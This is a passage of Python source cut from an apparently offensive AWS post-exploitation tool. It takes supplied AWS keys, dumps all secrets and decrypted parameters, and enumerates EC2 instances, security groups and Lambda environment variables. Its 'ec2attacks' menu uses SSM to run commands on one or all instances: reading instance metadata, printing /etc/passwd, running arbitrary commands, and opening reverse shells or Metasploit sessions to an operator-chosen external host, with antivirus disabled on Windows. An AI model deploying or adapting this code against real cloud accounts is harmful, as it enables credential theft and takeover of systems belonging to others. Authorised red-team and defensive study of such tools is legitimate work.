        print_color("[!] Error! No EC2 credentials set. Call setprofile first!")
        go_to_menu(caller)
    ec2resource = mysession.resource('ec2')
    iamresource = mysession.resource('iam')
    ssmclient = mysession.client('ssm')
    iamclient = mysession.client('iam')
    ec2client = mysession.client('ec2')
    with indent(6, quote=">>>>"):
        print_color('[*] Training mode entered')

        print_color('[..] preparing environment....')
        AssumeRolePolicydata = {'Version': '2012-10-17', 'Statement': {'Effect': 'Allow',
                                                                       'Principal': {'Service': 'ec2.amazonaws.com'},
                                                                       'Action': 'sts:AssumeRole'}}

        print_color('[..] Creating Assume Role Policy...')
        rolename = 'role' + id_generator()
        print_color('[..] Creating role with name: %s' % rolename)
        role = iamresource.create_role(
            RoleName=rolename, AssumeRolePolicyDocument=json.dumps(AssumeRolePolicydata))
        print_color("[+] Role created successfully.")
        print_color('[..] Attaching needed policies for role...')
        responseforrole = iamclient.attach_role_policy(
            RoleName=role.name, PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM')
        print_color('[+] Role attached successfully to policy AmazonEC2RoleforSSM')
        print_color('[..] Creating EC2 instance profile and adding it to role...')
        instance_profile = iamresource.create_instance_profile(
            InstanceProfileName=role.name)
        instance_profile.add_role(RoleName=role.name)
        OS, amznlnxaminame = choose_training_ami()
        print_color('[+] OS chosen is: %s' % OS)
        # "amzn2-ami-hvm-2.0.20190115-x86_64-gp2" #"amzn-ami-hvm-2018.03.0.20180811-x86_64-ebs"
        print_color('[+] Amazon AMI used is: %s' % amznlnxaminame)
        ami_images = list(ec2resource.images.filter(Filters=[{'Name': 'name', 'Values': [amznlnxaminame, ]}]))
        amznamiid = ami_images[0].image_id
        print_color('[..] Now creating EC2 instance of type t2.micro with this AMI....')
        time.sleep(10)
        newinstances = ec2resource.create_instances(
            ImageId=amznamiid, InstanceType='t2.micro', MinCount=1, MaxCount=1, IamInstanceProfile={'Name': role.name})
        newinstance = newinstances[0]
        print_color('[+] EC2 instance id is: %s' % newinstance.id)
        print_color(
            '[..] Waiting for EC2 instance to complete running..... This will take a while')
        newinstance.wait_until_running()
        newinstance.reload()
        print_color('[+] EC2 instance state is: %s' % newinstance.state)
        payload, action, disableav = shellscript_options(OS)

        print_color('[..] Sending the command "%s" to the running instance....' % payload)
        instanceid = newinstance.id
        time.sleep(10)
        if OS == 'linux':
            success = run_linux_command(ssmclient, instanceid, action, payload)
        else:
            print_color(
                '[..] Waiting for Windows EC2 instance to be ready... waiting for 2 minutes...')
            time.sleep(120)
            success = run_windows_command(
                ssmclient, instanceid, action, payload, disableav)
        #########
        #########
        print_color(
            '[+] Training mode done... Now terminating EC2 instance and deleting IAM role...')
        newinstance.terminate()
        print_color('[..] Waiting for instance to be terminated...')
        newinstance.wait_until_terminated()
        print_color('[+] EC2 instance terminated. Now detaching policy and deleting role...')
        instance_profile.remove_role(RoleName=role.name)
        instance_profile.delete()
        role.detach_policy(
            PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM')
        role.delete()
        print_color('[+] Done!')
    go_to_menu(caller)


def process_training_command(command):
    """
    Process command in the training menu.
    :param command: The command to process.
    :return: None
    """
    global menu_stack
    if command == 'help':
        training_help()
    elif command == 'where':
        print_color("You are in training menu", 'green')
    elif command == 'setprofile':
        set_aws_creds('training')
    elif command == 'start':
        start_training_mode('training')
    elif command == 'back':
        # handle_menu()
        menu_backward()
    elif command == 'showprofile':
        show_aws_creds('training')
    elif command == 'exit':
        exit()

    training_loop()

    """             pass
    elif command == 'setprofile':
        set_aws_creds('main')
    elif command == 'showprofile':
        show_aws_creds('main')
    elif command == 'dumpsecrets':
        find_all_creds('main')
    elif command == 'attacksurface':
        find_attacksurface('main')
"""


global INSTANCESIDCOMMANDS
INSTANCESIDCOMMANDS = []


def instanceidcomplete(text, state):
    """
    Auto complete for Instance ID table.
    """
    global INSTANCESIDCOMMANDS
    for cmd in INSTANCESIDCOMMANDS:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1


def get_instance_details(caller):
    """
    Return detailed info in JSON format about a particular instance.
    :param caller: The menu that called this function.
    :return: None
    """
    global my_aws_creds
    global ec2instances
    global INSTANCESIDCOMMANDS
    INSTANCESIDCOMMANDS = []
    mysession = ''
    try:
        mysession = my_aws_creds['session']
        possible_regions = my_aws_creds['possible_regions']
    except:
        print_color("[!] Error! No EC2 credentials set. Call setprofile first!")
        go_to_menu(caller)
    try:
        print_color(
            '[*] Your collected EC2 instances, if you want an updated list, invoke attacksurface:')
        instances_table = PrettyTable()
        possible_regions = []
        instances_table.field_names = ['Instance ID', 'Platform', 'Region', 'State', 'Public IP', 'Public DNS name',
                                       'Profile']
        if len(ec2instances['instances']) == 0:
            print_color('[!] You have no stored EC2 instances. Run the command attacksurface to discover them')
            go_to_menu(caller)
        for ins in ec2instances['instances']:
            INSTANCESIDCOMMANDS.append(ins['id'])
            instances_table.add_row([ins.get('id'), ins.get('platform'), ins.get('region'), ins.get('state'),
                                     ins.get('public_ip_address'),
                                     ins.get('public_dns_name'), ins.get('iam_profile', '')])

    except Exception as e:
        print(e)
        print_color(
            '[!] You have no stored EC2 instances. Run the command attacksurface to discover them')
        go_to_menu(caller)
    print(instances_table)
    print_color('[*] Target Options:')
    # paster
    readline.set_completer_delims(' \t\n;')
    readline.parse_and_bind("tab: complete")
    readline.set_completer(instanceidcomplete)
    target = prompt.query('Type/Paste your target EC2 ID:')
    region = ''
    for ins in ec2instances['instances']:
        if ins['id'] == target:
            region = ins['region']
            break
    ec2client = mysession.client('ec2', region_name=region)
    result = ec2client.describe_instances(InstanceIds=[target, ])

    jsonstr = json.dumps(
        result['Reservations'][0]['Instances'][0], indent=2, sort_keys=True, default=str)
    print(highlight(jsonstr, JsonLexer(), TerminalFormatter()))
    go_to_menu(caller)


def process_instances_command(command):
    """
    Process command in the EC2 instances menu.
    :param command: The command to process.
    :return: None
    """
    global menu_stack
    if command == 'help':
        instances_help()
    elif command == 'where':
        print_color("You are in EC2 instances menu", 'green')
    elif command == 'setprofile':
        set_aws_creds('ec2instances')
    elif command == 'showprofile':
        show_aws_creds('ec2instances')
    elif command == 'dumpsecrets':
        find_all_creds('ec2instances')
    elif command == 'attacksurface':
        find_attacksurface('ec2instances')
    elif command == 'showsecrets':
        show_cred_loot('ec2instances')
    elif command == 'securitygroups':
        get_security_groups('ec2instances')
    elif command == 'ec2attacks':
        ec2attacks('ec2instances')
    elif command == 'back':
        # handle_menu()
        menu_backward()
    elif command == 'list':
        get_ec2_instances('ec2instances')
    elif command == 'showsecrets':
        show_aws_creds('ec2instances')
    elif command == 'commandresults':
        check_command_invocations('ec2instances')
    elif command == 'instance':
        get_instance_details('ec2instances')
    elif command == 'exit':
        exit()

    instances_loop()


def instances_loop():
    """
    The command handler loop for the EC2 instances menu. Commands will be sent to the processor and the prompt will be displayed.
    :return: None
    """
    try:
        command = ''
        while command == '':
            try:
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(instancecomplete)
                command = input('barq ' + add_color('instances', 'blue') + ' > ')
            except Exception as e:
                print(e)
        command = str(command)
        process_instances_command(command)
    except KeyboardInterrupt as k:
        print("CTRL+C pressed.")
        choice = prompt.query(add_color(
            "Are you sure you want to go back to the main menu? Y/N", 'red'), default='Y')
        if choice == 'Y':
            menu_backward()
        else:
            instances_loop()


def main_loop():
    """
    The command handler loop for the main menu. Commands will be sent to the processor and the prompt will be displayed.
    :return: None
    """
    try:
        command = ''
        while command == '':
            try:
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(maincomplete)
                command = input('barq ' + add_color('main', 'green') + ' > ')
            except Exception as e:
                exit()
            # command = prompt.query('aws sheller main> ', validators=[])
        command = str(command)
        process_main_command(command)
    except KeyboardInterrupt as k:
        print_color("CTRL+C pressed. Exiting...", 'red')
        exit()


def process_main_command(command):
    """
    Process command in the main menu.
    :param command: The command to process.
    :return: None
    """
    global menu_stack
    if command == 'help':
        main_help()
    elif command == 'where':
        print_color('You are in the main menu', 'green')
    elif command == 'back':
        print_color('You are at the top menu', 'green')
    elif command == 'exit':
        # cleanup tasks
        try:
            exit()
        except:
            pass
    elif command == 'setprofile':
        set_aws_creds('main')
    elif command == 'showprofile':
        show_aws_creds('main')
    elif command == 'dumpsecrets':
        find_all_creds('main')
    elif command == 'attacksurface':
        find_attacksurface('main')
    elif command == 'showsecrets':
        show_cred_loot('main')

    elif command == 'securitygroups':
        get_security_groups('main')
    elif command == 'training':
        # menu_stack.append('training')
        # handle_menu()
        menu_forward('training')
    elif command == 'ec2instances':
        menu_forward('ec2instances')

    main_loop()


def find_all_creds(caller):
    """
    Find Secrets and Parameters stored in AWS Secrets Manager or Systems Manager Parameter store, respectively, for each region.
    :param caller: calling menu to return to.
    :return: None
    """
    global my_aws_creds
    global loot_creds
    mysession = ''
    try:
        mysession = my_aws_creds['session']
        possible_regions = my_aws_creds['possible_regions']
    except:
        print_color("[!] Error! No EC2 credentials set. Call setprofile first!")
        go_to_menu(caller)
    loot_creds = {'secrets': [], 'tokens': [], 'parameters': []}
    print_color('[..] Now iterating over all regions to get secrets and parameters...')
    for region in possible_regions:
        print_color('[*] Region currently searched for secrets: %s' % region)
        print_color('[..] Now searching for secrets in Secret Manager')
        # if my_aws_creds['aws_session_token'] == '':
        #    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region)
        # else:
        # mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region,aws_session_token=my_aws_creds['aws_session_token'])
        mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
                                          aws_secret_access_key=my_aws_creds['aws_secret_access_key'],
                                          region_name=region, aws_session_token=my_aws_creds['aws_session_token'])
        secretsclient = mysession.client(
            service_name='secretsmanager', region_name=region)
        try:
            secrets = secretsclient.list_secrets()['SecretList']
            secretnames = []
            for secret in secrets:
                secretnames.append(secret['Name'])
            for name in secretnames:
                resp = secretsclient.get_secret_value(SecretId=name)

                print_color("Secret Name: %s" % name, "green")
                print_color("Secret Value: %s" % resp['SecretString'], "green")
                resp2 = secretsclient.describe_secret(SecretId=name)
                description = resp2.get('Description', '')
                loot_creds['secrets'].append(
                    {'name': name, 'value': resp['SecretString'], 'description': description})
        except Exception as e:
            print(e)
            print_color('[!] No secrets in this region\'s Secret Manager...')
        print_color('[..] Now searching for secrets in Parameter Store')
        ssmclient = mysession.client('ssm', region_name=region)
        try:
            paramresponse = ssmclient.describe_parameters()
            paramnames = []
            for param in paramresponse.get('Parameters', []):
                if param.get('Name', '') != '':
                    paramnames.append(param.get('Name'))
            if len(paramnames) > 0:
                getparamsresponse = ssmclient.get_parameters(
                    Names=paramnames, WithDecryption=True).get('Parameters')
                for getparam in getparamsresponse:
                    print_color("Parameter Name: %s, Parameter Value: %s" %
                                (getparam['Name'], getparam['Value']), "green")
                    loot_creds['parameters'].append(
                        {'name': getparam['Name'], 'value': getparam['Value']})
        except Exception as e:
            print(e)
            print_color('[!] No Paramters in this region\'s Parameter Store...')

    print_color("[+] Done iterating on AWS secrets and parameters.")
    go_to_menu(caller)


def show_cred_loot(caller):
    """
    Show Secrets and Parameters looted from AWS Secrets Manager or Systems Manager Parameter store, respectively, for each region.
    :param caller: calling menu to return to
    :return: None
    """
    global loot_creds

    try:
        if len(loot_creds.get('secrets')) < 1:
            print_color(
                '[!] You have no stored secrets or parameters. Run the command dumpsecrets to set them')
            go_to_menu(caller)
        print_color('[*] Your collected secrets and credentials:')
        for secret in loot_creds['secrets']:
            print_color("===========", 'blue')
            print_color('[+] Name: %s' % secret.get('name'))
            print_color('[+] Value: %s' % secret.get('value'))
            print_color('[+] Description: %s' % secret.get('description'))
            # print_color('name: %s, value: %s, description: %s'%(secret.get('name'),secret.get('value'), secret.get('description','')), "green")
        for param in loot_creds['parameters']:
            print_color("===========", 'blue')
            print_color('[+] Name: %s' % param.get('name'))
            print_color('[+] Value: %s' % param.get('name'))
            # print_color('name: %s, value: %s'%(param.get('name'),param.get('value')), "green")
    except Exception as e:
        print(e)
        print_color(
            '[!] A problem in finding stored secrets or parameters. Run the command dumpsecrets to set them')
    go_to_menu(caller)


def get_ec2_instances(caller):
    """
    List discovered EC2 instances.
    :param caller: Calling menu to return to.
    :return: None
    """
    global ec2instances
    try:
        print_color(
            '[*] Your collected EC2 instances, if you want an updated list, invoke attacksurface:')
        instances_table = PrettyTable()
        instances_table.field_names = ['Instance ID', 'Platform', 'Region', 'State', 'Public IP', 'Public DNS name',
                                       'Profile']
        for ins in ec2instances['instances']:
            instances_table.add_row([ins.get('id'), ins.get('platform'), ins.get('region'), ins.get('state'),
                                     ins.get('public_ip_address'),
                                     ins.get('public_dns_name'), ins.get('iam_profile', '')])

        print(instances_table)
    except:
        print_color(
            '[!] You have no stored EC2 instances. Run the command attacksurface to discover them')
    go_to_menu(caller)


def get_security_groups(caller):
    """
    List security groups discovered.
    :param caller: calling menu to return to.
    :return: None
    """
    global secgroups
    try:
        print_color(
            '[*] Your collected security groups, if you want an updated list, invoke attacksurface:')
        for group in secgroups['groups']:
            print_color(f"Group ID: {group.get('id', '')}\n"
                        f"Group description: {group.get('description', '')}"
                        f"Group Ingress IP permissions:\n",
                        'green')
            for p in group['ip_permissions']:
                ranges = ''
                for iprange in p.get('ranges', []):
                    ranges = ranges + '%s,' % iprange['CidrIp']
                if len(ranges) > 1 and ranges[-1] == ',':
                    ranges = ranges[:-1]
                print_color('From Port: %s, To Port: %s, Protocol: %s, IP Ranges: %s' % (
                    p.get('fromport', 'Any'), p.get('toport', 'Any'), p.get('protocol', 'All'), ranges), 'green')
            print_color('Group Egress IP permissions:', 'green')
            for p in group['ip_permissions_egress']:
                ranges = ''
                for iprange in p.get('ranges', []):
                    ranges = ranges + '%s,' % iprange['CidrIp']
                if len(ranges) > 1 and ranges[-1] == ',':
                    ranges = ranges[:-1]
                print_color('From Port: %s, To Port: %s, Protocol: %s, IP Ranges: %s' % (
                    p.get('fromport', 'Any'), p.get('toport', 'Any'), p.get('protocol', 'All'), ranges), 'green')
            print_color("=======================================", 'magenta')

    except Exception as e:
        print(e)
        print_color('[!] You have no stored security groups. Run the command attacksurface to discover them')
    go_to_menu(caller)


def ec2attacks(caller):
    """
    Perform various attacks against All eligible EC2 instances in the account, or choose a single EC2 instance to attack.
    :param caller: Calling menu to return to.
    :return: None
    """
    global my_aws_creds
    global ec2instances
    global INSTANCESIDCOMMANDS
    INSTANCESIDCOMMANDS = []
    mysession = ''
    linux = False
    windows = False
    actual_targets = []
    try:
        mysession = my_aws_creds['session']
        possible_regions = my_aws_creds['possible_regions']
    except:
        print_color("[!] Error! No EC2 credentials set. Call setprofile first!")
        go_to_menu(caller)
    try:
        print_color(
            '[*] Your collected EC2 instances, if you want an updated list, invoke attacksurface:')
        instances_table = PrettyTable()
        possible_regions = []
        instances_table.field_names = [
            'Instance ID', 'Platform', 'Region', 'State', 'Public IP', 'Public DNS name', 'Profile']
        if len(ec2instances['instances']) == 0:
            print_color(
                '[!] You have no stored EC2 instances. Run the command attacksurface to discover them')
            go_to_menu(caller)
        for ins in ec2instances['instances']:
            if ins.get('iam_profile', '') != '' and ins.get('state', '') == 'running':
                instances_table.add_row([ins.get('id'), ins.get('platform'), ins.get('region'), ins.get('state'),
                                         ins.get('public_ip_address'),
                                         ins.get('public_dns_name'), ins.get('iam_profile', '')])
                actual_targets.append(ins)
                INSTANCESIDCOMMANDS.append(ins['id'])
            if ins.get('platform') == 'linux':
                linux = True
            else:
                windows = True
    except Exception as e:
        print(e)
        print_color('[!] You have no stored EC2 instances. Run the command attacksurface to discover them')
        go_to_menu(caller)
    print(instances_table)
    print_color('[*] Target Options:')
    target_options = [{'selector': '1', 'prompt': 'All EC2 instances', 'return': 'all'},
                      {'selector': '2', 'prompt': 'Single EC2 instance', 'return': 'single'}]
    target = prompt.options('Choose your target:', target_options)
    if target == 'single':
        # paster
        readline.set_completer_delims(' \t\n;')
        readline.parse_and_bind("tab: complete")
        readline.set_completer(instanceidcomplete)
        target = prompt.query('Type/Paste your target EC2 ID:')

    if target == "all":
        agree = prompt.query(
            'This is will launch the same attack on all EC2 instances. This is a very risk move! Do you want to proceed? Y/N?',
            default="N")
        if agree != 'Y':
            go_to_menu(caller)

    print_color('[*] EC2 Attack List:')
    attack_options = [
        {'selector': '1', 'prompt': 'Download EC2 metadata and userdata (custom init script)', 'return': 'metadata'},
        {'selector': '2', 'prompt': 'Display a file',
         'return': 'printfile'},
        {'selector': '3', 'prompt': 'Visit a URL from inside EC2 instance',
         'return': 'URL'},
        {'selector': '4', 'prompt': 'metasploit', 'return': 'msf'},
        {'selector': '5', 'prompt': 'Run a command',
         'return': 'command'},
        {'selector': '6', 'prompt': 'Reverse Shell to external server', 'return': 'reverseshell'}]
    attack = prompt.options('Choose your attack mode:', attack_options)

    if target != 'all':
        success = attack_single_target(caller, target, attack)

    elif target == "all":
        targets = actual_targets
        success = attack_multiple_targets(
            mysession, caller, targets, attack, linux, windows)
        print_color(
            '[+] Done launching attacks. Check command results with commandresults option.')

    go_to_menu(caller)


def attack_single_target(caller, target, attack):
    """
    Launch an attack on a single EC2 instance.
    :param caller: Calling menu to return to.
    :param target: Target EC2 instance id
    :param attack: The attack to launch.
    :return: True
    """
    global ec2instances
    target_id = ''
    target_platform = ''
    target_state = ''
    target_region = ''
    disableav = False
    for ins in ec2instances['instances']:
        if ins.get('id') == target:
            target_id = target
            target_platform = ins.get('platform')
            target_state = ins.get('state')
            target_region = ins.get('region')
            if target_state != 'running':
                print_color('[!] The chosen target is not running! Exiting...')
                go_to_menu(caller)

    if target_platform == 'linux':
        action = 'AWS-RunShellScript'
    else:
        action = 'AWS-RunPowerShellScript'
    remote_ip_host = ''
    remote_port = ''
    if attack == "reverseshell" or attack == "msf":
        print_color(
            f"You chose {attack} option. First provide your remote IP and port to explore shell options.",
            'magenta')
        remote_ip_host = prompt.query(
            'Your remote IP or hostname to connect back to:')
        remote_port = prompt.query("Your remote port number:", default="4444")
        if attack == "reverseshell":
            attack, action = reverseshell_options(
                remote_ip_host, remote_port, target_platform)
        elif attack == "msf":
            attack, action = metasploit_installed_options(
                remote_ip_host, remote_port, target_platform)
        disableav = True
    elif attack == 'URL':
        print_color('[*] Choose the URL to visit from inside the EC2 instance:')
        URL = prompt.query('URL: ', default="http://169.254.169.254/latest/")
        if target_platform == 'linux':
            attack = "python -c \"import requests; print requests.get('%s').text;\"" % URL
        else:
            attack = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;" % URL
    elif attack == "metadata":
        if target_platform == 'linux':
            attack = PRINT_EC2_METADATA_CMD
        else:
            attack = PRINT_EC2_METADATA_PSH
    elif attack == "printfile":
        filepath = prompt.query(
            'Enter the full file path: ', default="/etc/passwd")
        attack = "cat %s" % filepath
    elif attack == "command":
        attack = prompt.query(
            'Enter the full command to run: (bash for Linux - Powershell for Windows)',
            default="cat /etc/passwd")
        disableav = True

    print_color('Sending the command "%s" to the target instance %s....' % (attack, target), 'cyan')
    mysession = set_session_region(target_region)
    ssmclient = mysession.client('ssm')
    if target_platform == 'linux':
        success = run_linux_command(ssmclient, target, action, attack)
    else:
        success = run_windows_command(
            ssmclient, target, action, attack, disableav)
    return True


def attack_multiple_targets(mysession, caller, targets, attack, linux, windows):
    """
    Launch commands against multiple EC2 instances
    :param mysession: boto3 session object.
    :param caller: calling menu to return to.
    :param targets: List of target EC2 instances
    :param attack: The attack/command type
    :param linux: Whether or not Linux is included in the targets.
    :param windows: Whether or not Windows is included in the targets.
    :return: None
    """
    global command_invocations
    global logger

    windowsaction = 'AWS-RunPowerShellScript'
    linuxaction = 'AWS-RunShellScript'
    disableav = False
    if attack == "reverseshell" or attack == "msf":
        print_color('Make sure your shell listener tool can handle multiple simultaneous connections!', 'magenta')
        disableav = True
        if attack == "reverseshell":
            linuxattack, windowsattack = reverseshell_multiple_options(
                linux, windows)
        elif attack == "msf":
            linuxattack, windowsattack = metasploit_installed_multiple_options(
                linux, windows)
    elif attack == "URL":
        print_color('[*] Choose the URL to visit from inside the EC2 instances:')
        URL = prompt.query('URL: ', default="http://169.254.169.254/latest/")
        linuxattack = "python -c \"import requests; print requests.get('%s').text;\"" % URL
        windowsattack = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;" % URL
    elif attack == "metadata":
        linuxattack = PRINT_EC2_METADATA_CMD
        windowsattack = PRINT_EC2_METADATA_PSH
    elif attack == "printfile":
        linuxfilepath = prompt.query(
            '(Ignore if linux is not targeted)Enter the full file path for Linux instances: ', default="/etc/passwd")
        windowsfilepath = prompt.query(
            '(Ignore if Windows is not targeted)Enter the full file path for Windows instances: ',
            default="C:\\Windows\\System32\\drivers\\etc\\hosts")
        linuxattack = "cat %s" % linuxfilepath
        windowsattack = "cat %s" % windowsfilepath
    elif attack == "command":
        linuxattack = prompt.query(
            '(Ignore if linux is not targeted)Enter the full bash command to run: ', default="whoami")
        windowsattack = prompt.query(
            '(Ignore if Windows is not targeted)Enter the full Powershell command to run: ', default="whoami")
        disableav = True
    logger.error("before running threaded attacks")
    for target in targets:
        if target['platform'] == 'linux' and linux and target.get('iam_profile', '') != '' and linuxattack != '':
            # run_threaded_linux_command(mysession,target,linuxaction,linuxattack)
            logger.error("running run_threaded_linux_command for %s" %
                         target['id'])
            linuxthread = Thread(target=run_threaded_linux_command, args=(
                mysession, target, linuxaction, linuxattack))
            linuxthread.start()
            logger.error(
                "after running run_threaded_linux_command for %s" % target['id'])
        if target['platform'] == 'windows' and windows and target.get('iam_profile', '') != '' and windowsattack != '':
            logger.error(
                "running run_threaded_windows_command for %s" % target['id'])
            # run_threaded_windows_command(mysession,target,windowsaction,windowsattack)
            windowsthread = Thread(target=run_threaded_windows_command, args=(
                mysession, target, windowsaction, windowsattack, disableav))
            windowsthread.start()
            logger.error("after run_threaded_windows_command for %s" %
                         target['id'])

    # TODO: Decide best approach to launching and looping
    # loop over instances launching attack against each

    # loop over results.


def check_command_invocations(caller):
    """
    Check stored results of previously executed attacks on EC2 instances.
    :param caller: calling menu
    :return: None
    """
    global command_invocations
    if len(command_invocations['commands']) < 1:
        print_color(
            '[!] You don\'t have any commands run yet against EC2 targets. Run ec2attacks to launch commands.')
        go_to_menu(caller)

    for command in command_invocations['commands']:

        print_color(
            f"Command instance id: {command.get('id')}\n"
            f"Command state: {command.get('state')}\n"
            f"Command platform: {command.get('platform')}\n"
            f"Command region: {command.get('region')}\n",
            'green')
        error = command.get('error', 'No errors')
        error = error[:min(len(error), 5000)]
        print_color(f"Command error: {error}", 'green')
        output = command.get('output', 'No output')
        output = output[:min(len(output), 5000)]
        print_color(f"Command output: {output}", 'green')
        print_color("=======================================", 'magenta')


def find_attacksurface(caller):
    """
    Find the attack surface of this AWS account. Currently looks for EC2 instances and Security Groups.
    :param caller: calling menu
    :return: None
    """
    global my_aws_creds
    global ec2instances
    global secgroups
    global lambdafunctions
    mysession = ''
    try:
        mysession = my_aws_creds['session']
        possible_regions = my_aws_creds['possible_regions']
    except:
        print_color("[!] Error! No AWS credentials set. Call setprofile first!")
        go_to_menu(caller)
    ec2instances = {'instances': []}
    secgroups = {'groups': []}
    print_color('[..] Now iterating over all regions to discover public attack surface...')
    for region in possible_regions:
        print_color('[*] Region currently searched for details: %s' % region)

        # if my_aws_creds['aws_session_token'] == '':
        #    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region)
        # else:
        mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
                                          aws_secret_access_key=my_aws_creds[
                                              'aws_secret_access_key'], region_name=region,
                                          aws_session_token=my_aws_creds['aws_session_token'])
        ec2resource = mysession.resource('ec2')
        lambdaclient = mysession.client('lambda')
        instances = ec2resource.instances.all()
        print_color('[..] Now searching for details of EC2 instances')
        for instance in instances:
            print_color('[..] Now checking instance with id: %s' %
                        instance.instance_id)
            print_color('[+] Public host name: %s' % instance.public_dns_name)
            print_color('[+] Public IP: %s' % instance.public_ip_address)
            platform = ''
            if instance.platform == "windows":
                platform = 'windows'
                print_color('[+] OS is: Windows')
            else:
                platform = 'linux'
                print_color('[+] OS is: Linux')
            print_color('[+] AMI id: %s' % instance.image_id)
            print_color('[+] State: %s' % instance.state['Name'])
            print_color('[+] Region: %s' % region)
            profile = instance.iam_instance_profile
            if profile:
                profile = profile['Arn'].rsplit('/', 1)[-1]
            else:
                profile = ''
                print_color('', 'magenta')
            ec2instances['instances'].append({'id': instance.instance_id, 'public_dns_name': instance.public_dns_name,
                                              'public_ip_address': instance.public_ip_address,
                                              'platform': platform, 'ami_id': instance.image_id,
                                              'state': instance.state['Name'], 'region': region,
                                              'iam_profile': profile})

        print_color('[..] Now searching for details of security groups')
        security_groups = ec2resource.security_groups.all()
        for group in security_groups:
            thisgroup = {}
            thisgroup['description'] = group.description
            thisgroup['id'] = group.id

            print_color(
                f"Group id {group.id}\nGroup ip permissions:",
                'magenta')
            ip_permissions = []
            for rule in group.ip_permissions:
                ranges = ''
                for iprange in rule.get('IpRanges', []):
                    ranges = ranges + '%s,' % iprange['CidrIp']
                if len(ranges) > 1 and ranges[-1] == ',':
                    ranges = ranges[:-1]
                if ranges == '':
                    ranges = 'None'
                protocol = rule.get('IpProtocol')
                if ranges == '':
                    protocol = 'All'
                fromport = rule.get('FromPort', 'Any')
                toport = rule.get('ToPort', 'Any')
                print_color("Ingress Rule: fromport: %s, toport: %s, protocol: %s, IP ranges: %s" % (
                    fromport, toport, protocol, ranges), 'magenta')
                ip_permissions.append({'protocol': protocol, 'fromport': fromport,
                                       'toport': toport, 'ranges': rule.get('IpRanges', [])})
            print_color("group ip permissions egress", 'magenta')
            ip_permissions_egress = []
            for rule in group.ip_permissions_egress:
                ranges = ''
                for iprange in rule.get('IpRanges', []):
                    ranges = ranges + '%s,' % iprange['CidrIp']
                if len(ranges) > 1 and ranges[-1] == ',':
                    ranges = ranges[:-1]
                if ranges == '':
                    ranges = 'None'
                protocol = rule.get('IpProtocol')
                if ranges == '':
                    protocol = 'All'
                fromport = rule.get('FromPort', 'Any')
                toport = rule.get('ToPort', 'Any')
                print_color("Egress Rule: fromport: %s, toport: %s, protocol: %s, IP ranges: %s" % (
                    fromport, toport, protocol, ranges), 'magenta')
                ip_permissions_egress.append(
                    {'protocol': protocol, 'fromport': fromport, 'toport': toport, 'ranges': rule.get('IpRanges', [])})
            thisgroup['ip_permissions'] = ip_permissions
            thisgroup['ip_permissions_egress'] = ip_permissions_egress
            secgroups['groups'].append(thisgroup)

        print_color('[..] Now searching for details of lambda functions')
        function_results = lambdaclient.list_functions()
        functions = function_results['Functions']
        for function in functions:
            function_name = function['FunctionName']
            function_arn = function['FunctionArn']
            function_runtime = function.get('Runtime', '')
            function_role = function.get('Role', '')
            function_description = function.get('Description', '')
            function_Environment = function.get('Environment', {})

            print_color('[+] Function Name: %s' % function_name)
            print_color('[+] Function ARN: %s' % function_arn)
            print_color('[+] Function Runtime: %s' % function_runtime)
            print_color('[+] Function Role: %s' % function_role)
            print_color('[+] Function Description: %s' % function_description)
            print_color('[+] Function Environment variables: %s' % function_Environment)
            lambdafunctions['functions'].append({
                'name': function_name,
                'function_arn': function_arn,
                'function_runtime': function_runtime,
                'function_role': function_role,
                'function_description': function_description,
                'function_Environment': function_Environment,
                'region': region
            })
    go_to_menu(caller)


def convert_regions(raw_regions) -> list:
    region_table = PrettyTable(['Region'])
    regions = []
    for region in raw_regions:
        region_table.add_row([region['RegionName']])
        regions.append(region['RegionName'])
    return regions


def get_region(aws_access_key_id, aws_secret_access_key, aws_session_token, caller) -> T_REGION_NAME:
    if aws_session_token == '':
        mysession = boto3.session.Session(
            aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key, region_name='us-west-2')
    else:
        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,
                                          aws_secret_access_key=aws_secret_access_key,
                                          region_name='us-west-2', aws_session_token=aws_session_token)
    ec2client = mysession.client('ec2')
    regionresponse = ''
    choose_your_region = False
    possible_regions = []
    try:
        regionresponse = ec2client.describe_regions()
    except Exception as e:
        if "OptInRequired" in str(e):
            print_color("[!] OptInRequired Error: The keys are valid but you have a problem in your AWS account."
                        "Your account may be under validation by AWS. Is it a new account?")
        elif "UnauthorizedOperation" in str(e):
            choose_your_region = True
        else:
            print_color(
                "[!] Error accessing AWS services. Double check your AWS keys, tokens, privileges and region.")
            print(e)
        if choose_your_region == False:
            go_to_menu(caller)
    if choose_your_region == True:
        chosen_region = prompt.query(
            'What is your preferred AWS region?', default='us-east-1')
    else:
        region_table = convert_regions(raw_regions=regionresponse['Regions'])
        print(region_table)
        chosen_region = prompt.query(
            'What is your preferred AWS region?', default='us-east-1')
        if chosen_region not in possible_regions:
            print_color("[!] Invalid AWS region! Exiting....")
            exit()
    return chosen_region


def set_aws_creds(caller):
    """
    Set the AWS credentials of the targeted AWS account.
    :param caller: Calling menu
    :return: None
    """
    global menu_stack
    global my_aws_creds
    readline.set_completer(None)
    aws_access_key_id = getpass('Enter your AWS Access Key ID:')
    print_color("[*] Key id is: %s************%s" %
                (aws_access_key_id[0:2], aws_access_key_id[-3:-1]))
    aws_secret_access_key = getpass('Enter AWS Secret Access Key:')
    print_color("[*] secret key is: %s************%s" %
                (aws_secret_access_key[0:2], aws_secret_access_key[-3:-1]))
    aws_session_token = getpass("Enter your session token, only if needed: ")

    chosen_region = get_region(aws_session_token=aws_session_token,
